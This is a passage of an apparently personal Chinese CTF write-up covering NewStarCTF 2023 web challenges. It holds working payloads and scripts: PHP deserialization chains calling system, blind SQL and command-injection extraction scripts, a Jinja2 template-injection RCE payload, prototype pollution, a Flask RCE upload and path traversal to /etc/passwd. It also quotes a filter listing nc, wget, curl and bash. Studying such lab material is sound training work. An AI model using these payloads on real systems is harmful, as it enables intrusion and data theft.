__invoke()，当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用 这里很明显在Then类中的($this-&gt;func)();就是我们想要的，接下来在思考如何调用其所在tostring方法 __toString()，类被当成字符串时的回应方法 很明显上述代码中的正则表达式就是我们要的，在此表达式中name变量是会被当做字符串去检查是否匹配正则的，而destruct函数会在对象生命周期结束的时候自动调用。根据以上我们有如下pop链 begin-&gt;Then-&gt;Super-&gt;Handle-&gt;CTF-&gt;WhiteGod。如下 &lt;?php class Begin{ public $name; } class Then{ public $func; } class Handle{ public $obj; } class Super{ public $obj; } class CTF{ public $handle; } class WhiteGod{ public $func; public $var; } $poc = new Begin(); $poc-&gt;name = new Then(); $poc-&gt;name-&gt;func = new Super(); $poc-&gt;name-&gt;func-&gt;obj = new Handle(); $poc-&gt;name-&gt;func-&gt;obj-&gt;obj = new CTF(); $poc-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle = new WhiteGod(); $poc-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;func = 'system'; $poc-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;var = 'cat /flag'; echo urlencode(serialize($poc)); ?&gt; 这里注意($this-&gt;func)($this-&gt;var);我们如果想要查看根目录就需要system(‘ls /’)，但在如上pop链中是无法赋值使ls /两边的单引号正常显示的，这里测试一番发现ls /两边必须得含有单引号或者双引号才行，但如果\"'ls /'\";这样赋值也是行不通的，这里我也没咋懂是为什么，只有看wp来解惑了，但是我们赋值ls${IFS}/就可以正常显示 ![image-20231022093318823](NewStarCTF 2023/image-20231022093318823.png) 之后将var赋值为cat /flag即可 ![image-20231022093355514](NewStarCTF 2023/image-20231022093355514.png) 拿到 flag WEEK3|WEB-R!!!C!!!E!!! &lt;?php highlight_file(__FILE__); class minipop{ public $code; public $qwejaskdjnlka; public function __toString() { if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\{|\\}|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this-&gt;code)){ exec($this-&gt;code); } return \"alright\"; } public function __destruct() { echo $this-&gt;qwejaskdjnlka; } } if(isset($_POST['payload'])){ //wanna try? unserialize($_POST['payload']); } 这道题目的反序列化点很简单，重点就是RCE的时候采用的exec函数，这个函数在输入命令之后是不会回显最终结果的，因此考察我们对无回显RCE的掌握。 之前不会这个知识点，学习了一波再来看这个发现还是不能完全掌握。 正常情况我们可以通过反弹shell、外带数据、curl请求，等方法，但这里可以发现过滤很全以上情况都不能使用，之后看了wp发现有两种方法，一个是非预期 方法一：ls直接写入读取 这里呢官方也说了是由于权限没给死，导致我们可以用ls写入根目录去读取payload如下： &lt;?php highlight_file(__FILE__); class minipop{ public $code; public $qwejaskdjnlka; } $poc = new minipop(); $poc-&gt;qwejaskdjnlka = new minipop(); $poc-&gt;qwejaskdjnlka-&gt;code = \"ls / | t''ee 2\"; echo serialize($poc); ?&gt; 这里是将ls /输出的结果通过tee写入到2中，之后我们直接url拼接2即可读取到内容 ![image-20231029095629112](NewStarCTF 2023/image-20231029095629112.png)找到flag路径，那我们直接读取 &lt;?php highlight_file(__FILE__); class minipop{ public $code; public $qwejaskdjnlka; } $poc = new minipop(); $poc-&gt;qwejaskdjnlka = new minipop(); $poc-&gt;qwejaskdjnlka-&gt;code = \"cat /flag_is_h3eeere | t''ee 2\"; echo serialize($poc); ?&gt; ![image-20231029095757158](NewStarCTF 2023/image-20231029095757158.png) 拿到flag 方法二：bash盲注 这里预期解应该是bash盲注的，也就是在每次使用命令后使用cut等函数截一下字符串的某一位进行判断，这里官方wp给了个脚本，但是运行起来很费劲啊，出错率很高，似乎得运行好几次才有可能得到flag import time import requests url = \"http://152fe0ae-26ba-4e15-a358-96dc061a2152.node4.buuoj.cn:81/\" result = \"\" for i in range(1,15): for j in range(1,50): #ascii码表 for k in range(32,127): k=chr(k) payload =f\"if [ `cat /flag_is_h3eeere | awk NR=={i} | cut -c {j}` == '{k}' ];then sleep 2;fi\" length=len(payload) payload2 ={ \"payload\": 'O:7:\"minipop\":2:{{s:4:\"code\";N;s:13:\"qwejaskdjnlka\";O:7:\"minipop\":2:{{s:4:\"code\";s:{0}:\"{1}\";s:13:\"qwejaskdjnlka\";N;}}}}'.format( length, payload) } t1=time.time() r=requests.post(url=url,data=payload2) t2=time.time() if t2-t1 &gt;1.5: result+=k print(result) result += \" \" 由于咱也不会py脚本，也不知道如何改进。。。。 WEEK3|WEB-medium_sql ![image-20231029104228759](NewStarCTF 2023/image-20231029104228759.png) 依旧是sql注入不过可想而知这里过滤肯定更多，当时做的时候也是没做出来，毕竟是菜鸡。看了wp发现，还是要写py脚本（当时我也只是判断出来是可以进行报错注入，不过报错注入没有报错回显）而当时也不会写关于盲注脚本，于是就放弃了。今天学一下如何写 在week1的基础上，多过滤了union。 IF函数用法： IF函数根据判断条件是否成立进行选择执行，成立时执行一条语句，不成立时执行另一条语句 语法结构 IF(condition, value_if_true, value_if_false) 参数说明 condition: 判断条件 value_if_true: 如果condition的结果为TRUE，返回该值 value_if_false: 如果condition的结果为FALSE，返回该值 验证存在布尔盲注： ?id=TMP0919' And if(1&gt;0,1,0)# ?id=TMP0919' And if(0&gt;1,1,0)# 上面是官方wp给出的判断，这里我复现缺不成功，之后我换成了–+注释便成功了 ![image-20231029105300325](NewStarCTF 2023/image-20231029105300325.png) 如果是#注释的话，会有下图报错，说是浏览器无法解析你所发送的请求。。。。 ![image-20231029105409952](NewStarCTF 2023/image-20231029105409952.png) 正确payload如下： ?id=TMP0919' And if(1&gt;0,1,0)--+ ?id=TMP0919' And if(0&gt;1,1,0)--+ 发现第一个有回显，第二个会报错说：id不存在，故存在布尔盲注 这里直接上py脚本了（用的二分查找，很高效） import requests import time def condition(res): #判断回显内容中是否有关键词 if 'Physics' in res.text: return True return False result = '' _url = 'http://574acc4c-77b6-4ebe-8f29-28c546083e86.node4.buuoj.cn:81/' for _time in range(1,1000): print(\"time:%d\" % (_time)) left = 32 right = 128 while (right &gt; left): mid = (left + right) // 2 # 获取当前库表名 # url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom {_time} FOr 1))))In({mid})),1,0)%23\" url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom {_time} FOr 1))))In({mid})),1,0)%23\" # 获取字段名 # url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In ('here_is_flag'))) fRom {_time} FOr 1))))In({mid})),1,0)%23\" # 获取字段值 time.sleep(0.2) res = requests.get(url=url) if (condition(res)): result += chr(mid) print(result) break else: # 获取当前库表名 # url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23\" # 获取字段名 # url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In ('here_is_flag'))) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23\" # 获取字段值 url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23\" res = requests.get(url=url) if (condition(res)): left = mid else: right = mid 思路就是先构造url，接着第一个循环定义了个time变量，用途记录当前查询进程的同时，可会在后续起到截取一个字符的作用，用于匹配ascii码值是否相等。随后定义了left，right用于二分查找，只有当right大于left后在进入循环，随后定义一个中间值mid url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom {_time} FOr 1))))In({mid})),1,0)%23\" 这里是我们要查找的payload，思路就是先是寻常sql语句，select…from…之后通过from time for 1提取某一个确定字符，ord转换成ascii值，再与当前mid值进行比较，如果相等则填充到result结果中，如果不想等，则判断当前ord值与mid值的大小，进而判断后续mid值的取法。 我再练习一波上述代码的编写就ok了！ ![image-20231029141425644](NewStarCTF 2023/image-20231029141425644.png) WEEK3|WEB-GenShin ![image-20231029150138096](NewStarCTF 2023/image-20231029150138096.png) 这里提示我们找一些信息，看了wp知道在响应头中有一个Pop头，包含着一个路由，但我搜寻了一番也没发现Pop的作用，可能就是出题人自己设置的吧 ![image-20231029150249693](NewStarCTF 2023/image-20231029150249693.png) 我们添加该url访问看到页面要求我们给name进行get传参 ![image-20231029150313194](NewStarCTF 2023/image-20231029150313194.png) 这里刚传了一下就被ban了。。。之后我也就不知道了，又得看wp，他是这样说的： 首先尝试一下普通的{{7*7}}，因为被过滤了连续的{{，所以这里回显不了 那么只有用另一个方法了，在{% %}里面可以执行python命令，只要不报错就行，比如 其实每次我们遇到这种题目都是应该去fuzz一下，看看过滤了那些字符，但我也不知道如何去fuzz，只是感觉是去搞一个专门的字典去爆破看回显状态（但心里也没底） ![image-20231029150632111](NewStarCTF 2023/image-20231029150632111.png) 如上图我们成功执行，接下来查看一下是否存在key ![image-20231029151043843](NewStarCTF 2023/image-20231029151043843.png) 如上图是不存在的，那就是常规思路：拿到相关函数进行命令执行，我们先查看一下子类 ?name={%print(\"\".__class__.__base__.__subclasses__())%} ![image-20231029151546824](NewStarCTF 2023/image-20231029151546824.png) 这里成功在132处找到我们需要的函数，但接下来发现init被过滤了，我们采用字符串拼接绕过 ?name={%print(\"\".__class__.__base__.__subclasses__()[132]|attr(\"__in\"+\"it__\")|attr(\"__globals__\"))%} ![image-20231029152337985](NewStarCTF 2023/image-20231029152337985.png) 这里采用eval函数，随后进行利用的时候发现将os等过滤了，这里想采用unicode编码的，但也是被过滤了，之后又尝试base64也是不行 看了wp发现这里要用chr编码绕过 eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41)) 如上是他的payload，但这里有个坑，他们之间不可用小数点连接，不然py会认为后者是前者的属性，而这个师傅采用%2b连接也就是+号，但是你直接写入+号也不可，当你这样输入会发现，url将其当做空格。故他采用%2b连接 最终payload如下： ?name={%print(\"\".__class__.__base__.__subclasses__()[132]|attr(\"__in\"+\"it__\")|attr(\"__globals__\")|attr(\"get\")(\"__builtins__\")|attr(\"get\")(\"eval\")(\"eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))\"))%} ![image-20231029155143561](NewStarCTF 2023/image-20231029155143561.png) 拿到flag WEEK3|WEB-OtenkiGirl 一道nodejs原型链污染的题目，我对这一块儿掌握很少，虽然在此之前学习了一波，但还是不熟练，下面跟着wp走一遍 ![image-20231030213459589](NewStarCTF 2023/image-20231030213459589.png) 首先我们随便输入信息，抓包看一下 ![image-20231030213641774](NewStarCTF 2023/image-20231030213641774.png) 发现是一些基本信息，数据格式为json。接下来分析一波题目给的附件，这里先看看app.js的内容 ![image-20231030215106140](NewStarCTF 2023/image-20231030215106140.png) 如上图，感觉重点就是给了两个路由：info和submit，并且还判断了一下请求包的某些数据是否符合规定，再决定是否回显正确数据。 那我们接下来看看submit.js和info.js 其中submit中的重点我感觉就是merge函数，这里肯定就是漏洞利用点了，但我们还不清楚漏洞在哪里，接下来在看看info ![image-20231030214323684](NewStarCTF 2023/image-20231030214323684.png) 但看了半天也看不懂，只怪自己代码审计不行啊，看wp如何分析吧 查看routes/info.js源码，考察从数据库中获取数据的函数getInfo async function getInfo(timestamp) { timestamp = typeof timestamp === \"number\" ? timestamp : Date.now(); // Remove test data from before the movie was released let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime(); timestamp = Math.max(timestamp, minTimestamp); const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`, [timestamp]).catch(e =&gt; { throw e }); return data; } 其中第4行和第5行将我们传入的timestamp做了一个过滤，使得所返回的数据不早于配置文件中的min_public_time 具体解释为： 这行代码初始化一个minTimestamp变量。它从配置对象CONFIG中获取min_public_time属性的值，如果不存在则使用默认配置对象DEFAULT_CONFIG中的min_public_time属性的值。然后，通过new Date()构造函数将该时间转换为一个日期对象，并使用getTime()方法获取其对应的时间戳。 查看根目录下的config.js和config.default.js后发现config.js并没有配置min_public_time，因此getInfo的第5行只是采用了DEFAULT_CONFIG.min_public_time --这里我们可以猜测，如果我们可以实现将其返回一个比min_public_time还要早的时间，说不定就会找到flag ![image-20231030221439241](NewStarCTF 2023/image-20231030221439241.png) 考虑原型链污染污染min_public_time为我们想要的日期，就能绕过最早时间限制，获取任意时间的数据 结合routes/submit.js源码的注入点 ![image-20231030221603437](NewStarCTF 2023/image-20231030221603437.png) 我们可以看到在这里他将数据data赋值给DEFAULT参数，而该参数中只含有date和place，那我们直接修改data的data['__proto__']['min_public_time']值即可，payload如下 {\"contact\":\"asd\",\"reason\":\"asd\",\"__proto__\":{\"min_public_time\":\"1001-01-01\"}} ![image-20231030222312128](NewStarCTF 2023/image-20231030222312128.png) 之后访问/info/0会发现多出很多信息，其中找到flag，这里注意上下图的解析格式，上面为application/json，下面的如下图 ![image-20231030222453202](NewStarCTF 2023/image-20231030222453202.png) 至于上述为何要访问/info/0这个路由是因为下面的代码 ![image-20231030222701126](NewStarCTF 2023/image-20231030222701126.png) 如上图，info/0，这里的0是可变的，之后他会检查content-type等等，之后没问题的话会调用getinfo函数查询数据库，回显内容。 **注意：**在提交 payload 的请求后直接刷新网页并不会获取到上面的数据，这是因为网页启用了缓存，会发送本地缓存中最晚时间的info请求。如果想要通过刷新网页获取数据，只需要在开发者工具 -&gt; 应用程序 -&gt; 存储中清除网站数据然后刷新网页即可。 只能说，遇到这种题，很考验代码审计功底，先不说技术如何，一堆堆的代码需要足够的耐心去审，要不是我靠着wp，我估计就疯掉了。。。。，唉，还是缺乏学习的精神。 WEEK4|WEB-逃 &lt;?php highlight_file(__FILE__); function waf($str){ return str_replace(\"bad\",\"good\",$str); } class GetFlag { public $key; public $cmd = \"whoami\"; public function __construct($key) { $this-&gt;key = $key; } public function __destruct() { system($this-&gt;cmd); } } unserialize(waf(serialize(new GetFlag($_GET['key'])))); www-data www-data 顾名思义，这道题就是简单的反序列化字符串逃逸，首先我们先本地运行一下看看，序列化字符串结构 ![image-20231106200131159](NewStarCTF 2023/image-20231106200131159.png) 可以看到其中的cmd并不可控，但由于waf的存在，我们可以实现字符串逃逸，将后续的s:3:\"cmd\";s:6:\"whoami\";}踢出去 我们看如下 ![image-20231106200324320](NewStarCTF 2023/image-20231106200324320.png) 如上图，s:6但后续的goodgood是八个，那最后的两个od字符就会被抛弃，当然，此时的序列化字符串也因为这个原因变得不合法，因此我们需要利用这个特点来构造出合法的字符串去修改cmd的值。 我们想达到的payload为：\";s:3:\"cmd\";s:2:\"ls\";}共22个字符，而bad换成good多了一个字符，因此我们需要搞22个bad即可，payload如下： badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:2:\"ls\";} badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:9:\"cat /flag\";} ![image-20231106201141230](NewStarCTF 2023/image-20231106201141230.png) 拿到flag WEEK4|WEB-More Fast &lt;?php highlight_file(__FILE__); class Start{ public $errMsg; public function __destruct() { die($this-&gt;errMsg); } } class Pwn{ public $obj; public function __invoke(){ $this-&gt;obj-&gt;evil(); } public function evil() { phpinfo(); } } class Reverse{ public $func; public function __get($var) { ($this-&gt;func)(); } } class Web{ public $func; public $var; public function evil() { if(!preg_match(\"/flag/i\",$this-&gt;var)){ ($this-&gt;func)($this-&gt;var); }else{ echo \"Not Flag\"; } } } class Crypto{ public $obj; public function __toString() { $wel = $this-&gt;obj-&gt;good; return \"NewStar\"; } } class Misc{ public function evil() { echo \"good job but nothing\"; } } $a = @unserialize($_POST['fast']); throw new Exception(\"Nope\"); Fatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 55 简单分析一下链子，pop链子如下：start.die-&gt;Crypto.toString-&gt;Reverse.get-&gt;Pwn.invoke-&gt;web.evil 就在我以为这道题很简单的时候，还是翻车了，在传入上述payload无果后，我注意到了throw new Exception(\"Nope\");，因为此前并没有见过，但我肯定问题就是这里了，于是关键词搜了搜，发现是GC垃圾回收机制在作怪。这里也没有很清楚的搞明白是怎么一回事，这里我先复现出来在思考吧。 文章说这里我们需要手动的去销毁对象，也就是是使用数组绕过：payload如下 &lt;?php class Start{ public $errMsg; } class Pwn{ public $obj; } class Reverse{ public $func; } class Web{ public $func; public $var; } class Crypto{ public $obj; } class Misc{ } $poc = new Start(); $poc-&gt;errMsg = new Crypto(); $poc-&gt;errMsg-&gt;obj = new Reverse(); $poc-&gt;errMsg-&gt;obj-&gt;func = new Pwn(); $poc-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = new Web(); $poc-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;func = 'system'; $poc-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;var = 'ls'; echo serialize($poc); ?&gt; 这里我们最先的payload，这里做如下修改serialize(array($poc, null)); 得到 a:2:{i:0;O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:2:\"ls\";}}}}}i:1;N;} 接着将后续的1改为0 a:2:{i:0;O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:2:\"ls\";}}}}}i:0;N;} ![image-20231106204545388](NewStarCTF 2023/image-20231106204545388.png) 成功回显，最终payload a:2:{i:0;O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:9:\"cat /fla*\";}}}}}i:0;N;} //通配符绕过 ![image-20231106204623504](NewStarCTF 2023/image-20231106204623504.png) 接下来开始仔细思考了，相关文章是这样说的： 在php中，当对象被销毁时会自动调用__destruct()方法，但如果程序报错或者抛出异常，就不会触发该魔术方法。 当一个类创建之后它会自己消失，而 __destruct() 魔术方法的触发条件就是一个类被销毁时触发，而throw那个函数就是回收了自动销毁的类，导致destruct检测不到有东西销毁，从而也就导致无法触发destruct函数。 我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒__destruct()魔术方法。 触发垃圾回收机制的方法有：（本质即使对象引用计数归零） （1）对象被unset()处理时，可以触发。 （2）数组对象为NULL时，可以触发。 这里在总结一下destruct魔术方法的调用情况： 1.主动调用unset($obj) 2.主动调用$obj = NULL 3.程序自动结束 除此之外，PHP还拥有垃圾回收Garbage collection即我们常说的GC机制。 PHP中GC使用引用计数和回收周期自动管理内存对象，那么这时候当我们的对象变成了“垃圾”，就会被GC机制自动回收掉，回收过程中，就会调用函数的__destruct。 刚才我们提到了引用计数，其实当一个对象没有任何引用的时候，则会被视为“垃圾”，即 $a = new test(); test 对象被 变量 a 引用， 所以该对象不是“垃圾”，而如果是这样 new test(); 或这样 $a = new test(); $a = 1; 这样在 test 在没有被引用或在失去引用时便会被当作“垃圾”进行回收 如： &lt;?php class test{ function __construct($i) {$this-&gt;i = $i; } function __destruct() { echo $this-&gt;i.\"Destroy... \"; } } new test('1'); $a = new test('2'); $a = new test('3'); echo \"————————————&lt;br/&gt;\"; 输出 1Destroy... 2Destroy... ———————————— 3Destroy... 这里是当a第二次赋值时,test('2')失去引用，执行__destruct,然后执行echo,当程序完了后test('3')销毁，执行它的__destruct 举个栗子： &lt;?php class test { function __destruct() { echo 'success!!'; } } if(isset($_REQUEST['input'])) { $a = unserialize($_REQUEST['input']); throw new Exception('lose'); } 这里我们要求输出 success!! ，但执行反序列化后得到的对象有了引用，给了 a 变量，后面程序接着就抛出一个异常，非正常结束，导致未正常完成 GC 机制，即没有执行 __destruct 。 直接构造反序列化 test 类得到（这里都是借用的文章例子 ![image-20231106212531886](NewStarCTF 2023/image-20231106212531886.png) 所以我们要反序列化手动去 “销毁” 创造的对象。这里我们可以利用数组来完成。构造 class test {} $a = serialize(array(new test, null)); echo $a.'&lt;br/&gt;'; $a = str_replace(':1', ':0', $a);//将序列化的数组下标为0的元素给为null echo $a; 得到 a:2:{i:0;O:4:\"test\":0:{}i:1;N;} a:2:{i:0;O:4:\"test\":0:{}i:0;N;}//最终payload 传入，成功得到 success!! ![image-20231106212541970](NewStarCTF 2023/image-20231106212541970.png) 我们序列化一个数组对象，考虑反序列化本字符串，因为反序列化的过程是顺序执行的，所以到第一个属性时，会将Array[0]设置为对象，同时我们又将Array[0]设置为null，这样前面的test对象便丢失了引用，就会被GC所捕获，就可以执行__destruct了。 至于具体的GC机制原理，这里我也不想深究了（因为懒，如果日后有缘在学习吧，不过相关原理文章我会附在下面的 WEEK4|WEB-More Fast-midsql 这里是sql注入，简单测试几番，结果实践能力差的我，没测出来过滤了什么就看wp了，结果只是过滤了个空格，看来以后得认真学学如何手动fuzz处大概过滤的东西。这里确定是空格之后，尝试报错，联合等等注入均无果，页面返回结果一致，于是尝试时间盲注 ?id=1/**/and/**/if(2&gt;1,sleep(5),1) ?id=1/**/and/**/if(1&gt;1,sleep(5),1) 经过上述payload的测试，发现页面有明显的时间延迟的现象，那肯定就是时间盲注了，肯定就得写脚本了（又是脚本┭┮﹏┭┮，真心不会写啊）下去得进修一下python代码了 这里先构造一条payload： ?id=1/**/and/**/if(ascii(substr((select/**/group_concat(table_name)from(information_schema.schemata)),{i},1))&gt;{mid},sleep(5),1) 随后编写脚本 这里的脚本也是不知道咋优化，但是看官方的又感觉有点复杂。。。 import time import requests url = 'http://f6337ab6-ed3c-472d-835f-3b756a55dd5d.node4.buuoj.cn:81/?id=' database_name = \"\" for i in range(1, 100): left = 32 right = 128 mid = (left + right) // 2 while left &lt; right: payload = url + f\"1/**/and/**/if(ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),{i},1))&gt;{mid},sleep(2),0)#\" start_time = time.time() response = requests.get(payload).text end_time = time.time() use_time = end_time - start_time if use_time &gt; 2: left = mid + 1 else: right = mid mid = (left + right) // 2 print(mid) database_name += chr(mid) print(database_name) 但是出来的结果总是有垃圾字符，头疼。。。 ​ WEEK4|WEB-flask disk 这道题目也是之前oxgame刷到过，也是关于PIN码，我以为与那个类似点，但还是有所区别，不过这在暗示我得学习一波flask的PIN码了 ![image-20231107201543598](NewStarCTF 2023/image-20231107201543598.png) 这里题目给了三个链接，一个是会显示上传的文件时间等信息啥的，不过最开始开显示着app.py，然后upload是一个上传页面，不过没啥过滤 ![image-20231107201642236](NewStarCTF 2023/image-20231107201642236.png) 而最后一个是一个让写PIN码的页面，这里只要学过相关知识可以知道此时肯定是开启了debug模式的，不过我也就只能想到这里（在没学之前）于是看了看wp： 访问admin manage发现要输入pin码，说明flask开启了debug模式。flask开启了debug模式下，app.py源文件被修改后会立刻加载。所以只需要上传一个能rce的app.py文件把原来的覆盖，就可以了。注意语法不能出错，否则会崩溃。 也是很惊讶，竟然可以这样，那我们直接写一个py，在upload上传即可 from flask import Flask, request import os app = Flask(__name__) @app.route('/') def index(): try: cmd = request.args.get('cmd')#Python pass 是空语句，是为了保持程序结构的完整性。pass 不做任何事情，一般用做占位语句。 data = os.popen(cmd).read() return data except: pass return \"1\" if __name__ = '__main__': app.run(host='0.0.0.0', port=5000, debug=True) 比如上述py就注意需要导入必要的flask，app.run等等 ![image-20231107203516994](NewStarCTF 2023/image-20231107203516994.png) 这里也是踩了个小坑，上传的文件名一定要是app.py不然覆盖不了。。。。。下面附一个题目源码： from flask import Flask,request,send_file import os,datetime app = Flask(__name__) @app.route('/',methods=['GET']) def index(): return '&lt;h1&gt;Welcome to my flask disk&lt;/h1&gt;&lt;a href=\"/list\"&gt;list files&lt;/a&gt;&lt;br&gt;&lt;a href=\"/upload\"&gt;upload files&lt;/a&gt;&lt;br&gt;&lt;a href=\"/console\"&gt;admin manage&lt;/a&gt;' @app.route('/list',methods=['GET']) def list(): dirs = os.listdir('.')#返回指定路径下的文件和文件夹列表。这里应该就是当前目录下的文件 items = '' for dir in dirs: if os.path.isfile(dir):#判断路径是否为文件 create_time = int(os.path.getctime(dir))#返回文件 path 创建时间 create_time = datetime.datetime.fromtimestamp(create_time)#这里是对create_time这个时间戳转换为正常日期 #下面是返回文件大小，如果文件不存在就返回错误 item =f'&lt;/pre&gt;{dir} {str(os.path.getsize(dir))}b {create_time}&lt;/pre&gt;&lt;br&gt;&lt;br&gt;' items += item items += ' ' return items @app.route('/upload',methods=['GET','POST']) def upload(): if request.method == 'GET': s='&lt;form action=\"/upload\" method=\"POST\" enctype=\"multipart/form-data\"&gt;&lt;input type=\"file\" name=\"file\"&gt;&lt;input type=\"submit\" value=\"Upload\"&gt;&lt;/form&gt;' return s elif request.method == 'POST': file = request.files['file']#post上传文件file if '..' in file.filename or '/' in file.filename:#防止目录穿越 return '.. and / are not allowed!' file.save(file.filename)#保存上传的文件 return 'upload success. &lt;a href=\"/list\"&gt;check&lt;/a&gt;' @app.route('/download',methods=['GET','POST']) def download(): filename = request.args.get('filename')#接受filename的get传参 if filename and os.path.exists(filename):#判断filename参数是否存在，且对应的文件是否存在 if '..' in filename or '/' in filename:#防止目录穿越 return '.. and / are not allowed!' return send_file(filename,as_attachment=True)#as_attachment确保filename对应的文件可以正常的被下载到 else: return 'no file to download or file not exist' if __name__=='__main__': app.run(host='0.0.0.0',debug=True,port=5000) 至于PIN码的学习，之后另开一篇文章 WEEK4|WEB-InjectMe ![image-20231107213238881](NewStarCTF 2023/image-20231107213238881.png) 首页提示我们图片似乎有秘密，这里直接点击进去看到了有很多文件或者图像可以读取，看了一通发现 ![image-20231107213326629](NewStarCTF 2023/image-20231107213326629.png) 除了上图的ds文件，就只有下面这个有些许源码的图了，这里只放了download路由的实现方法 ![image-20231107212741290](NewStarCTF 2023/image-20231107212741290.png) 这里分析发现，会接受一个file的get传参，之后对传入的参数进行…/的过滤，但这里只替换了一次。明显可以双写绕过，那我们直接目录穿越读取文件，这里我们直接读取如下文件 ?file=....//....//....//....//....//etc/passwd ?file=....//....//....//....//....//app/app.py root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin 这里第二个路径靠的是题目给的附件才出来的 ![image-20231107213918683](NewStarCTF 2023/image-20231107213918683.png) import os import re from flask import Flask, render_template, request, abort, send_file, session, render_template_string from config import secret_key app = Flask(__name__) app.secret_key = secret_key#有session伪造的感觉了 @app.route('/') def hello_world(): # put application's code here return render_template('index.html') @app.route(\"/cancanneed\", methods=[\"GET\"]) def cancanneed(): #os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表 all_filename = os.listdir('./static/img/') filename = request.args.get('file', '') if filename: return render_template('img.html', filename=filename, all_filename=all_filename) else: return 